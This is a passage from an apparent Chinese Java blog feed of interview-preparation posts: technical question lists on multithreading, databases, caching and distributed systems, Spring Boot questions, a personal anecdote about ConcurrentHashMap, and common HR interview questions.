href="https://mp.weixin.qq.com/s/rIjRobCRFmmXrbktr_llPA">这里</a>有一套答案版的Spring试题。</li></ol><p><strong>操作系统</strong></p><ol><li>Linux系统下你关注过哪些内核参数，说说你知道的。</li><li>Linux下IO模型有几种，各自的含义是什么。</li><li>epoll和poll有什么区别。</li><li>平时用到哪些Linux命令。</li><li>用一行命令查看文件的最后五行。</li><li>用一行命令输出正在运行的java进程。</li><li>介绍下你理解的操作系统中线程切换过程。</li><li>进程和线程的区别。</li><li>top 命令之后有哪些内容，有什么作用。</li><li>线上CPU爆高，请问你如何找到问题所在。</li></ol><p><strong>多线程</strong></p><ol><li>多线程的几种实现方式，什么是线程安全。</li><li>volatile的原理，作用，能代替锁么。</li><li>画一个线程的生命周期状态图。</li><li>sleep和wait的区别。</li><li>sleep和sleep(0)的区别。</li><li>Lock与Synchronized的区别 。</li><li>synchronized的原理是什么，一般用在什么地方(比如加在静态方法和非静态方法的区别，静<br>态方法和非静态方法同时执行的时候会有影响吗)，解释以下名词：重排序，自旋锁，偏向锁，轻<br>量级锁，可重入锁，公平锁，非公平锁，乐观锁，悲观锁。</li><li>用过哪些原子类，他们的原理是什么。</li><li>JUC下研究过哪些并发工具，讲讲原理。</li><li>用过线程池吗，如果用过，请说明原理，并说说newCache和newFixed有什么区别，构造函<br>数的各个参数的含义是什么，比如coreSize，maxsize等。</li><li>线程池的关闭方式有几种，各自的区别是什么。</li><li>假如有一个第三方接口，有很多个线程去调用获取数据，现在规定每秒钟最多有10个线程同<br>时调用它，如何做到。</li><li>spring的controller是单例还是多例，怎么保证并发的安全。</li><li>用三个线程按顺序循环打印abc三个字母，比如abcabcabc。</li><li>ThreadLocal用过么，用途是什么，原理是什么，用的时候要注意什么。</li><li>如果让你实现一个并发安全的链表，你会怎么做。</li><li>有哪些无锁数据结构，他们实现的原理是什么。</li><li>讲讲java同步机制的wait和notify。</li><li>CAS机制是什么，如何解决ABA问题。</li><li>多线程如果线程挂住了怎么办。</li><li>countdowlatch和cyclicbarrier的内部原理和用法，以及相互之间的差别(比如<br>countdownlatch的await方法和是怎么实现的)。</li><li>对AbstractQueuedSynchronizer了解多少，讲讲加锁和解锁的流程，独占锁和公平所<br>加锁有什么不同。</li><li>使用synchronized修饰静态方法和非静态方法有什么区别。</li><li>简述ConcurrentLinkedQueue和LinkedBlockingQueue的用处和不同之处。</li><li>导致线程死锁的原因？怎么解除线程死锁。</li><li>非常多个线程（可能是不同机器），相互之间需要等待协调，才能完成某种工作，问怎么设计这种协调方案。</li><li>用过读写锁吗，原理是什么，一般在什么场景下用。</li><li>开启多个线程，如果保证顺序执行，有哪几种实现方式，或者如何保证多个线程都执行完<br>再拿到结果。</li><li>延迟队列的实现方式，delayQueue和时间轮算法的异同。</li><li>点击<a href="https://mp.weixin.qq.com/s/0CI9od4DIxRrmOGFJw0SuQ">这里</a>有一套答案版的多线程试题。</li></ol><p><strong>TCP与HTTP</strong></p><ol><li>http1.0和http1.1有什么区别。</li><li>TCP三次握手和四次挥手的流程，为什么断开连接要4次,如果握手只有两次，会出现什么。</li><li>TIME_WAIT和CLOSE_WAIT的区别。</li><li>说说你知道的几种HTTP响应码，比如200, 302, 404。</li><li>当你用浏览器打开一个链接（如：<a href="http://www.javastack.cn/">http://www.javastack.cn/</a>  ）的时候，计算机做了哪些工作步骤。</li><li>TCP&#x2F;IP如何保证可靠性，说说TCP头的结构。</li><li>如何避免浏览器缓存。</li><li>如何理解HTTP协议的无状态性。</li><li>简述Http请求get和post的区别以及数据包格式。</li><li>HTTP有哪些method</li><li>简述HTTP请求的报文格式。</li><li>HTTP的长连接是什么意思。</li><li>HTTPS的加密方式是什么，讲讲整个加密解密流程。</li><li>Http和https的三次握手有什么区别。</li><li>什么是分块传送。</li><li>Session和cookie的区别。</li><li>点击<a href="https://mp.weixin.qq.com/s/YbQqvdgyuznbfn4HZLP-XQ">这里</a>有一套答案版的试题。</li></ol><p><strong>架构设计与分布式</strong></p><ol><li>用java自己实现一个LRU。</li><li>分布式集群下如何做到唯一序列号。</li><li>设计一个秒杀系统，30分钟没付款就自动关闭交易。</li><li>如何使用redis和zookeeper实现分布式锁？有什么区别优缺点，会有什么问题，分别适用什么<br>场景。（延伸：如果知道redlock，讲讲他的算法实现，争议在哪里）</li><li>如果有人恶意创建非法连接，怎么解决。</li><li>分布式事务的原理，优缺点，如何使用分布式事务，2pc 3pc 的区别，解决了哪些问题，还有<br>哪些问题没解决，如何解决，你自己项目里涉及到分布式事务是怎么处理的。</li><li>什么是一致性hash。</li><li>什么是restful，讲讲你理解的restful。</li><li>如何设计一个良好的API。</li><li>如何设计建立和保持100w的长连接。</li><li>解释什么是MESI协议(缓存一致性)。</li><li>说说你知道的几种HASH算法，简单的也可以。</li><li>什么是paxos算法， 什么是zab协议。</li><li>一个在线文档系统，文档可以被编辑，如何防止多人同时对同<br>一份文档进行编辑更新。</li><li>线上系统突然变得异常缓慢，你如何查找问题。</li><li>说说你平时用到的设计模式。</li><li>Dubbo的原理，有看过源码么，数据怎么流转的，怎么实现集群，负载均衡，服务注册<br>和发现，重试转发，快速失败的策略是怎样的 。</li><li>一次RPC请求的流程是什么。</li><li>自己实现过rpc么，原理可以简单讲讲。Rpc要解决什么问题。</li><li>异步模式的用途和意义。</li><li>编程中自己都怎么考虑一些设计原则的，比如开闭原则，以及在工作中的应用。</li><li>设计一个社交网站中的“私信”功能，要求高并发、可扩展等等。 画一下架构图。</li><li>MVC模式，即常见的MVC框架。</li><li>聊下曾经参与设计的服务器架构并画图，谈谈遇到的问题，怎么解决的。</li><li>应用服务器怎么监控性能，各种方式的区别。</li><li>如何设计一套高并发支付方案，架构如何设计。</li><li>如何实现负载均衡，有哪些算法可以实现。</li><li>Zookeeper的用途，选举的原理是什么。</li><li>Zookeeper watch机制原理。</li><li>Mybatis的底层实现原理。</li><li>请思考一个方案，实现分布式环境下的countDownLatch。</li><li>后台系统怎么防止请求重复提交。</li><li>描述一个服务从发布到被消费的详细过程。</li><li>讲讲你理解的服务治理。</li><li>如何做到接口的幂等性。</li><li>如何做限流策略，令牌桶和漏斗算法的使用场景。</li><li>什么叫数据一致性，你怎么理解数据一致性。</li><li>分布式服务调用方，不依赖服务提供方的话，怎么处理服务方挂掉后，大量无效资源请求<br>的浪费，如果只是服务提供方吞吐不高的时候该怎么做，如果服务挂了，那么一会重启，该怎<br>么做到最小的资源浪费，流量半开的实现机制是什么。</li><li>dubbo的泛化调用怎么实现的，如果是你，你会怎么做。</li><li>远程调用会有超时现象，如果做到优雅的控制，JDK自带的超时机制有哪些，怎么实现的。</li></ol><p><strong>算法</strong></p><ol><li>10亿个数字里里面找最小的10个。</li><li>有1亿个数字，其中有2个是重复的，快速找到它，时间和空间要最优。</li><li>2亿个随机生成的无序整数,找出中间大小的值。</li><li>给一个不知道长度的（可能很大）输入字符串，设计一种方案，将重复的字符排重。</li><li>遍历二叉树。</li><li>有3n+1个数字，其中3n个中是重复的，只有1个是不重复的，怎么找出来。</li><li>写一个字符串（如：<a href="http://www.javastack.cn)反转函数./">www.javastack.cn）反转函数。</a></li><li>常用的排序算法，快排，归并、冒泡。 快排的最优时间复杂度，最差复杂度。冒泡排序的<br>优化方案。</li><li>二分查找的时间复杂度，优势。</li><li>一个已经构建好的TreeSet，怎么完成倒排序。</li><li>什么是B+树，B-树，列出实际的使用场景。</li><li>一个单向链表，删除倒数第N个数据。</li><li>200个有序的数组，每个数组里面100个元素，找出top20的元素。</li><li>单向链表，查找中间的那个元素。</li></ol><p><strong>数据库知识</strong></p><ol><li>数据库隔离级别有哪些，各自的含义是什么，MYSQL默认的隔离级别是是什么。</li><li>什么是幻读。</li><li>MYSQL有哪些存储引擎，各自优缺点。</li><li>高并发下，如何做到安全的修改同一行数据。</li><li>乐观锁和悲观锁是什么，INNODB的标准行级锁有哪2种，解释其含义。</li><li>SQL优化的一般步骤是什么，怎么看执行计划，如何理解其中各个字段的含义。</li><li>数据库会死锁吗，举一个死锁的例子，mysql怎么解决死锁。</li><li>MYsql的索引原理，索引的类型有哪些，如何创建合理的索引，索引如何优化。</li><li>聚集索引和非聚集索引的区别。</li><li>select for update 是什么含义，会锁表还是锁行或是其他。</li><li>为什么要用Btree实现，它是怎么分裂的，什么时候分裂，为什么是平衡的。</li><li>数据库的ACID是什么。</li><li>某个表有近千万数据，CRUD比较慢，如何优化。</li><li>Mysql怎么优化table scan的。</li><li>如何写sql能够有效的使用到复合索引。</li><li>mysql中in 和exists 区别。</li><li>数据库自增主键可能的问题。</li><li>MVCC的含义，如何实现的。</li><li>你做过的项目里遇到分库分表了吗，怎么做的，有用到中间件么，比如sharding jdbc等,他<br>们的原理知道么。</li><li>MYSQL的主从延迟怎么解决。</li></ol><p><strong>消息队列</strong></p><ol><li>消息队列的使用场景。</li><li>消息的重发，补充策略。</li><li>如何保证消息的有序性。</li><li>用过哪些MQ，和其他mq比较有什么优缺点，MQ的连接是线程安全的吗，你们公司的MQ服务<br>架构怎样的。</li><li>MQ系统的数据如何保证不丢失。</li><li>rabbitmq如何实现集群高可用。</li><li>kafka吞吐量高的原因。</li><li>kafka 和其他消息队列的区别，kafka 主从同步怎么实现。</li><li>利用mq怎么实现最终一致性。</li><li>使用kafka有没有遇到什么问题，怎么解决的。</li><li>MQ有可能发生重复消费，如何避免，如何做到幂等。</li><li>MQ的消息延迟了怎么处理，消息可以设置过期时间么，过期了你们一般怎么处理。</li></ol><p><strong>缓存</strong> </p><ol><li>常见的缓存策略有哪些，如何做到缓存(比如redis)与DB里的数据一致性，你们项目中用到了<br>什么缓存系统，如何设计的。</li><li>如何防止缓存击穿和雪崩。</li><li>缓存数据过期后的更新如何设计。</li><li>redis的list结构相关的操作。</li><li>Redis的数据结构都有哪些。</li><li>Redis的使用要注意什么，讲讲持久化方式，内存设置，集群的应用和优劣势，淘汰策略等。</li><li>redis2和redis3的区别，redis3内部通讯机制。</li><li>当前redis集群有哪些玩法，各自优缺点，场景。</li><li>Memcache的原理，哪些数据适合放在缓存中。</li><li>redis和memcached 的内存管理的区别。</li><li>Redis的并发竞争问题如何解决，了解Redis事务的CAS操作吗。</li><li>Redis的选举算法和流程是怎样的。</li><li>redis的持久化的机制，aof和rdb的区别。</li><li>redis的集群怎么同步的数据的。</li><li>知道哪些redis的优化操作。</li><li>Reids的主从复制机制原理。</li><li>Redis的线程模型是什么。</li><li>请思考一个方案，设计一个可以控制缓存总体大小的自动适应的本地缓存。</li><li>如何看待缓存的使用（本地缓存，集中式缓存），简述本地缓存和集中式缓存和优缺点。<br>本地缓存在并发使用时的注意事项。</li></ol><p><strong>搜索</strong></p><ol><li>elasticsearch了解多少，说说你们公司es的集群架构，索引数据大小，分片有多少，以及一些<br>调优手段 。elasticsearch的倒排索引是什么。</li><li>elasticsearch 索引数据多了怎么办，如何调优，部署。</li><li>elasticsearch是如何实现master选举的。</li><li>详细描述一下Elasticsearch索引文档的过程。</li><li>详细描述一下Elasticsearch搜索的过程。</li><li>Elasticsearch在部署时，对Linux的设置有哪些优化方法？</li><li>lucence内部结构是什么。</li></ol><hr><p>以上面试题整理来源于网络，仅供给大家参考，没有答案哦。大家对比一下，自己还差多远？从而提高面试成功率。</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>吐血整理 20 道 Spring Boot 面试题！</title>
      <link href="/2025/10/30/%E9%9D%A2%E8%AF%95/%E5%90%90%E8%A1%80%E6%95%B4%E7%90%86%2020%20%E9%81%93%20Spring%20Boot%20%E9%9D%A2%E8%AF%95%E9%A2%98%EF%BC%81/"/>
      <url>/2025/10/30/%E9%9D%A2%E8%AF%95/%E5%90%90%E8%A1%80%E6%95%B4%E7%90%86%2020%20%E9%81%93%20Spring%20Boot%20%E9%9D%A2%E8%AF%95%E9%A2%98%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>面试了一些人，简历上都说自己熟悉 Spring Boot, 或者说正在学习 Spring Boot，一问他们时，都只停留在简单的使用阶段，很多东西都不清楚，也让我对面试者大失所望。</p><p>下面，我给大家总结下有哪些 Spring Boot 的面试题，这是我经常拿来问面试者的，希望对你有帮助。</p><p>1、什么是 Spring Boot？</p><p>2、为什么要用 Spring Boot？</p><p>3、Spring Boot 的核心配置文件有哪几个？它们的区别是什么？</p><p>4、Spring Boot 的配置文件有哪几种格式？它们有什么区别？</p><p>5、Spring Boot 的核心注解是哪个？它主要由哪几个注解组成的？</p><p>6、开启 Spring Boot 特性有哪几种方式？</p><p>7、Spring Boot 需要独立的容器运行吗？</p><p>8、运行 Spring Boot 有哪几种方式？</p><p>9、Spring Boot 自动配置原理是什么？</p><p>10、Spring Boot 的目录结构是怎样的？</p><p>11、你如何理解 Spring Boot 中的 Starters？</p><p>12、如何在 Spring Boot 启动的时候运行一些特定的代码？</p><p>13、Spring Boot 有哪几种读取配置的方式？</p><p>14、Spring Boot 支持哪些日志框架？推荐和默认的日志框架是哪个？</p><p>15、SpringBoot 实现热部署有哪几种方式？</p><p>16、你如何理解 Spring Boot 配置加载顺序？</p><p>17、Spring Boot 如何定义多套不同环境配置？</p><p>18、Spring Boot 可以兼容老 Spring 项目吗，如何做？</p><p>19、保护 Spring Boot 应用有哪些方法？</p><p>20、Spring Boot 2.X 有什么新特性？与 1.X 有什么区别？</p><hr><p>终于写完了，希望大家好好学习下再去面试，不然再被面试官问这些问题，又答不上来就尴尬了。弄懂了这些问题，对你理解 Spring Boot 也有非常大的帮助。</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>周末去面试，进去 5 分钟就出来了…</title>
      <link href="/2025/10/30/%E9%9D%A2%E8%AF%95/%E5%91%A8%E6%9C%AB%E5%8E%BB%E9%9D%A2%E8%AF%95%EF%BC%8C%E8%BF%9B%E5%8E%BB%205%20%E5%88%86%E9%92%9F%E5%B0%B1%E5%87%BA%E6%9D%A5%E4%BA%86%E2%80%A6/"/>
      <url>/2025/10/30/%E9%9D%A2%E8%AF%95/%E5%91%A8%E6%9C%AB%E5%8E%BB%E9%9D%A2%E8%AF%95%EF%BC%8C%E8%BF%9B%E5%8E%BB%205%20%E5%88%86%E9%92%9F%E5%B0%B1%E5%87%BA%E6%9D%A5%E4%BA%86%E2%80%A6/</url>
      
        <content type="html"><![CDATA[<p>你们可能会想，栈长这么菜的吗？5分钟都坚持不了？</p><p>本文说起来会有点尴尬，毕竟这是栈长我曾经经历过的故事。。。</p><p>那时候的栈长还真菜，每天写着 if&#x2F; for 及一些简单的业务逻辑代码，虽工作有些日子了，但技术水平还停留在刚毕业的起步阶段。。。</p><p>记得，那是一个周末，栈长去某知名互联网公司面试，好像不到五分钟，我就被面试官亲切地赶出来了，当时我那个尴尬，内心深受打击。。。</p><p>为什么会被赶出来？这道题我记得很清楚，我不确定是不是因为这道题，但却是这道题结束了整个面试，大概的经过是这样：</p><blockquote><p>面试官：HashMap 和 Hashtable 的区别是什么？</p><p>栈长：……（这个我答上来了，栈长整理了下，大家可以参考这篇文章：<a href="https://mp.weixin.qq.com/s/EGqKMndXiJDIMeRQwxBd_w">HashMap 和 Hashtable 的 6 个区别</a>。）</p><p>面试官：那既然 Hashtable<br>是线程安全的，又性能不好，那你还知道别的替代品吗？</p><p>栈长：……（没答上来）</p><p>面试官：好吧，那我们今天先聊到这里吧（起身送我走）……</p><p>栈长：好的，谢谢。（尴尬离场）</p></blockquote><p>现在想起来都觉得尴尬。。。</p><p>现在竞争这么大，要求那么高，只会 Hashtable 的程序员真不能立足了，至少你得说得出 <code>SynchronizedMap</code>，虽然它的性能和 Hashtable 一样差，使用了全局对象锁来保证线程安全性，但至少你不只是会 Hashtable。</p><p>其实上面的问题，最佳答案是：<code>ConcurrentHashMap</code>，说完这个，有很大概率面试官又会连番问它的实现原理，以及它在 JDK 各个版本中的不同。</p><p>ConcurrentHashMap 是 JDK 1.5 添加的新集合，用来保证线程安全性，提升 Map 集合的并发效率。ConcurrentHashMap 使用了 <code>Segment</code> 的概念，默认有 16 个 <code>Segment</code>，<code>Segment</code> 里面依然还是数组 + 链表的数据结构，相当于给 HashMap 分桶处理了。因每次只会锁住其中一个 <code>Segment</code>，所以性能非常好。</p><p>然而，有意思的是，随着 JDK 1.8 中对 HashMap 的改进，同时又对 ConcurrentHashMap 进行了改进，抛弃了 <code>Segment + 数组 + 单向链表</code> 的设计，改为了和 HashMap 同样的 <code>数组 + 单向链表 + 红黑树</code> 的数据结构。</p><p>同时，ConcurrentHashMap 使用了 <code>CAS 算法 + Synchronized</code> 来保证集合的线程安全性，ConcurrentHashMap 相当于一个性能安全的 HashMap。ConcurrentHashMap 源码相当复杂。</p><p>不过话又说回来，当初栈长面试 5 分钟就被送出来了，其实很正常，谁叫我当时只会 Hashtable 呢！就像我现在面试人一样，如果中高级面试者只会 Hashtable 讲不出其他更多的，我也一样也会把他送出去，初级的还可以理解。</p><p>现在很多中高级程序员，虽然年限已经达到三年或者五年以上，但实际对多线程知识了解甚少，还停留在如何实现和使用多线程的水平。这种其实和初级程序员没什么区别，竞争力明显不足，所以怎么能要得到比初级程序员更高的价格呢？天天写业务代码，又如何成为大牛呢？</p><p>所以，给 Java 程序员的一些建议，特别是中高级程序员，一定要把 Java 核心技术学好，如多线程、集合的应用、数据结构、原理等，这是中高级面试必问的。</p><p>不要年纪上去了，对于底层知识却不知道一二，不然随着年纪的不断增长，被淘汰的风险就越大，这样对于一个靠编码吃饭的程序来说，真的很可怕！</p><p>如果你被我说中了，或许考虑换一个环境？</p><p>最近栈长我会陆续分享一些个人的职场经验，踩坑经历，以及成长感悟，希望能给一些职场新猿带来帮助。</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序员如何面对 HR 面试的 40 的问题！</title>
      <link href="/2025/10/30/%E9%9D%A2%E8%AF%95/%E7%A8%8B%E5%BA%8F%E5%91%98%E5%A6%82%E4%BD%95%E9%9D%A2%E5%AF%B9%20HR%20%E9%9D%A2%E8%AF%95%E7%9A%84%2040%20%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%81/"/>
      <url>/2025/10/30/%E9%9D%A2%E8%AF%95/%E7%A8%8B%E5%BA%8F%E5%91%98%E5%A6%82%E4%BD%95%E9%9D%A2%E5%AF%B9%20HR%20%E9%9D%A2%E8%AF%95%E7%9A%84%2040%20%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/18-3-23/13146083.jpg"></p><p>讲一个身边朋友亲身经历的故事吧。</p><p>一个技术非常牛的朋友去阿里面试，成功通过了几轮技术车轮战，最后躺在了 HR 面上。。。所以，尽管你技术再牛逼，你回答不好 HR 的问题，赢得不了 HR 的认可，你最终也进不了公司。因为最终发 Offer 的是 HR，HR 也要为整个公司人力资源负责的。</p><p>技术人员平时在技术与代码中沉淀，缺少沟通，缺少交际，这其实对个人很不利。面试也一样，技术是敲门砖，如何更顺利地进入公司，或者拿到更理想的岗位和薪资待遇也是每个职场人士需要学习的。</p><p>我自己也曾经被 HR 问得无可反驭，或者没有下文。为了使大家少走点弯路，多拿点工资，我给大家总结了这么多年来在职场上 HR 问得最多的题目，不管你是新人或者老司机，我想你们都会有所感触的！</p><hr><p>1、请你自我介绍一下你自己？ </p><p>2、你觉得你个性上最大的优点是什么？</p><p>3、说说你最大的缺点？</p><p>4、你对加班的看法？</p><p>5、你对薪资的要求？</p><p>6、你的职业规划？</p><p>7、你还有什么问题要问吗？</p><p>8、如果通过这次面试我们单位录用了你，但工作一段时间却发现你根本不适合这个职位，你怎么办？</p><p>9、在完成某项工作时，你认为领导要求的方式不是最好的，自己还有更好的方法，你应该怎么做？</p><p>10、如果你的工作出现失误，给本公司造成经济损失，你认为该怎么办？</p><p>11、谈谈你对跳槽的看法？</p><p>12、工作中你难以和同事、上司相处，你该怎么办？</p><p>13、你对于我们公司了解多少？</p><p>14、请说出你选择这份工作的动机？</p><p>15、你最擅长的技术方向是什么？</p><p>16、你能为我们公司带来什么呢？</p><p>17、最能概括你自己的三个词是什么？</p><p>18、为什么要离职?</p><p>19、对工作的期望与目标何在？</p><p>20、就你申请的这个职位，你认为你还欠缺什么？</p><p>21、你通常如何处理別人的批评？</p><p>22、怎样对待自己的失敗？</p><p>23、什么会让你有成就感？</p><p>24、你为什么愿意到我们公司来工作？</p><p>25、你和别人发生过争执吗？你是怎样解决的？</p><p>26、对这项工作，你有哪些可预见的困难？</p><p>27、如果我录用你，你将怎样开展工作？</p><p>28、在完成某项工作时，你认为领导要求的方式不是最好的，自己还有更好的方法，你应该怎么做？与上级意见不一是，你将怎么办？</p><p>29、你工作经验欠缺，如何能胜任这项工作？</p><p>30、您在前一家公司的离职原因是什么？</p><p>31、为了做好你工作份外之事，你该怎样获得他人的支持和帮助？</p><p>32、果你在这次面试中没有被录用，你怎么打算？</p><p>33、谈谈你过去做过的成功案例？(工作中遇到什么问题)</p><p>34、如何安排自己的时间？会不会排斥加班？</p><p>35、这个职务的期许？</p><p>36、什么选择我们这家公司？</p><p>37、谈谈如何适应办公室工作的新环境？</p><p>38、工作中学习到了些什么？</p><p>39、除了本公司外，还应聘了哪些公司？</p><p>40、何时可以到职？</p><hr>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通往大神之路，百度 Java 面试题前 200 页。</title>
      <link href="/2025/10/30/%E9%9D%A2%E8%AF%95/%E9%80%9A%E5%BE%80%E5%A4%A7%E7%A5%9E%E4%B9%8B%E8%B7%AF%EF%BC%8C%E7%99%BE%E5%BA%A6%20Java%20%E9%9D%A2%E8%AF%95%E9%A2%98%E5%89%8D%20200%20%E9%A1%B5%E3%80%82/"/>
      <url>/2025/10/30/%E9%9D%A2%E8%AF%95/%E9%80%9A%E5%BE%80%E5%A4%A7%E7%A5%9E%E4%B9%8B%E8%B7%AF%EF%BC%8C%E7%99%BE%E5%BA%A6%20Java%20%E9%9D%A2%E8%AF%95%E9%A2%98%E5%89%8D%20200%20%E9%A1%B5%E3%80%82/</url>
      
        <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><ul><li>操作系统中 heap 和 stack 的区别 </li><li>什么是基于注解的切面实现</li><li>什么是 对象&#x2F;关系 映射集成模块</li><li>什么是 Java 的反射机制</li><li>什么是 ACID</li><li>BS与CS的联系与区别</li><li>Cookie 和 Session的区别</li><li>fail-fast 与 fail-safe 机制有什么区别</li><li>get 和 post请求的区别</li><li>Interface 与 abstract 类的区别</li><li>IOC的优点是什么</li><li>IO 和 NIO的区别，NIO优点</li><li>Java 8 &#x2F; Java 7 为我们提供了什么新功能</li><li>什么是竞态条件？ 举个例子说明。</li><li>JRE、JDK、JVM 及 JIT 之间有什么不同</li><li>MVC的各个部分都有那些技术来实现?如何实现?</li><li>RPC 通信和 RMI 区别 </li><li>什么是 Web Service（Web服务）</li><li>JSWDL开发包的介绍。JAXP、JAXM的解释。SOAP、UDDI,WSDL解释。 </li><li>WEB容器主要有哪些功能? 并请列出一些常见的WEB容器名字。</li><li>一个”.java”源文件中是否可以包含多个类（不是内部类）？有什么限制</li><li>简单说说你了解的类加载器。是否实现过类加载器</li><li>解释一下什么叫AOP（面向切面编程）</li><li>请简述 Servlet 的生命周期及其相关的方法</li><li>请简述一下 Ajax 的原理及实现步骤</li><li>简单描述Struts的主要功能</li><li>什么是 N 层架构</li><li>什么是CORBA？用途是什么</li><li>什么是Java虚拟机？为什么Java被称作是“平台无关的编程语言”</li><li>什么是正则表达式？用途是什么？哪个包使用正则表达式来实现模式匹配</li><li>什么是懒加载（Lazy Loading）</li><li>什么是尾递归，为什么需要尾递归</li><li>什么是控制反转（Inversion of Control）与依赖注入（Dependency Injection）</li></ul><h2 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h2><ul><li>finalize<ul><li>什么是finalize()方法<ul><li>finalize()方法什么时候被调用</li><li>析构函数(finalization)的目的是什么</li><li>final 和 finalize 的区别</li><li>final</li></ul></li><li>final关键字有哪些用法<ul><li>final 与 static 关键字可以用于哪里？它们的作用是什么</li><li>final, finally, finalize的区别</li><li>final、finalize 和 finally 的不同之处？</li></ul></li><li>能否在运行时向 static final 类型的赋值<ul><li>使用final关键字修饰一个变量时，是引用不能变，还是引用的对象不能变</li><li>一个类被声明为final类型，表示了什么意思</li><li>throws, throw, try, catch, finally分别代表什么意义</li></ul></li></ul></li><li>Java 有几种修饰符？分别用来修饰什么</li><li>volatile<ul><li>volatile 修饰符的有过什么实践</li><li>volatile 变量是什么？volatile 变量和 atomic 变量有什么不同</li><li>volatile 类型变量提供什么保证？能使得一个非原子操作变成原子操作吗</li><li>能创建 volatile 数组吗？</li></ul></li><li>transient变量有什么特点</li><li>super什么时候使用</li><li>public static void 写成 static public void会怎样</li><li>说明一下public static void main(String args[])这段声明里每个关键字的作用</li><li>请说出作用域public, private, protected, 以及不写时的区别</li><li>sizeof 是Java 的关键字吗</li><li>static<ul><li>static class 与 non static class的区别</li><li>static 关键字是什么意思？Java中是否可以覆盖(override)一个private或者是static的方法</li><li>静态类型有什么特点</li><li>main() 方法为什么必须是静态的？能不能声明 main() 方法为非静态</li><li>是否可以从一个静态（static）方法内部发出对非静态（non-static）方法的调用</li><li>静态变量在什么时候加载？编译期还是运行期？静态代码块加载的时机呢</li><li>成员方法是否可以访问静态变量？为什么静态方法不能访问成员变量</li></ul></li><li>switch<ul><li>switch 语句中的表达式可以是什么类型数据</li><li>switch 是否能作用在byte 上，是否能作用在long 上，是否能作用在String上</li></ul></li><li>while 循环和 do 循环有什么不同</li></ul><h2 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h2><ul><li>&amp;操作符和&amp;&amp;操作符有什么区别?</li><li>a &#x3D; a + b 与 a +&#x3D; b 的区别？ </li><li>逻辑操作符 (&amp;,|,^)与条件操作符(&amp;&amp;,||)的区别</li><li>3*0.1 &#x3D;&#x3D; 0.3 将会返回什么？true 还是 false？ </li><li>float f&#x3D;3.4; 是否正确？</li><li>short s1 &#x3D; 1; s1 &#x3D; s1 + 1;有什么错?</li></ul><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><ul><li>基础类型(Primitives)<ul><li>基础类型(Primitives)与封装类型(Wrappers)的区别在哪里</li><li>简述九种基本数据类型的大小，以及他们的封装类</li><li>int 和 Integer 哪个会占用更多的内存？ int 和 Integer 有什么区别？parseInt()函数在什么时候使用到</li><li>float和double的默认值是多少</li><li>如何去小数四舍五入保留小数点后两位</li><li>char 型变量中能不能存贮一个中文汉字，为什么</li></ul></li><li>类型转换<ul><li>怎样将 bytes 转换为 long 类型</li><li>怎么将 byte 转换为 String</li><li>如何将数值型字符转换为数字</li><li>我们能将 int 强制转换为 byte 类型的变量吗？如果该值大于 byte 类型的范围，将会出现什么现象</li><li>能在不进行强制转换的情况下将一个 double 值赋值给 long 类型的变量吗</li><li>类型向下转换是什么</li></ul></li><li>数组<ul><li>如何权衡是使用无序的数组还是有序的数组</li><li>怎么判断数组是 null 还是为空</li><li>怎么打印数组？ 怎样打印数组中的重复元素</li><li>Array 和 ArrayList有什么区别？什么时候应该使用Array而不是ArrayList</li><li>数组和链表数据结构描述，各自的时间复杂度</li><li>数组有没有length()这个方法? String有没有length()这个方法</li></ul></li><li>队列<ul><li>队列和栈是什么，列出它们的区别</li><li>BlockingQueue是什么</li><li>简述 ConcurrentLinkedQueue LinkedBlockingQueue 的用处和不同之处。</li></ul></li><li>ArrayList、Vector、LinkedList的存储性能和特性</li><li>String</li><li>StringBuffer<ul><li>ByteBuffer 与 StringBuffer有什么区别</li></ul></li><li>HashMap<ul><li>HashMap的工作原理是什么</li><li>内部的数据结构是什么</li><li>HashMap 的 table的容量如何确定？loadFactor 是什么？ 该容量如何变化？这种变化会带来什么问题？</li><li>HashMap 实现的数据结构是什么？如何实现</li><li>HashMap 和 HashTable、ConcurrentHashMap 的区别</li><li>HashMap的遍历方式及效率</li><li>HashMap、LinkedMap、TreeMap的区别</li><li>如何决定选用HashMap还是TreeMap</li><li>如果HashMap的大小超过了负载因子(load factor)定义的容量，怎么办 </li><li>HashMap 是线程安全的吗？并发下使用的 Map 是什么，它们内部原理分别是什么，比如存储方式、 hashcode、扩容、 默认容量等</li></ul></li><li>HashSet<ul><li>HashSet和TreeSet有什么区别 </li><li>HashSet 内部是如何工作的</li><li>WeakHashMap 是怎么工作的？</li></ul></li><li>Set<ul><li>Set 里的元素是不能重复的，那么用什么方法来区分重复与否呢？是用 &#x3D;&#x3D; 还是 equals()？ 它们有何区别?</li><li>TreeMap：TreeMap 是采用什么树实现的？TreeMap、HashMap、LindedHashMap的区别。TreeMap和TreeSet在排序时如何比较元素？Collections工具类中的sort()方法如何比较元素？</li><li>TreeSet：一个已经构建好的 TreeSet，怎么完成倒排序。</li><li>EnumSet 是什么</li></ul></li><li>Hash算法<ul><li>Hashcode 的作用</li><li>简述一致性 Hash 算法</li><li>有没有可能 两个不相等的对象有相同的 hashcode？当两个对象 hashcode 相同怎么办？如何获取值对象 </li><li>为什么在重写 equals 方法的时候需要重写 hashCode 方法？equals与 hashCode 的异同点在哪里</li><li>a.hashCode() 有什么用？与 a.equals(b) 有什么关系</li><li>hashCode() 和 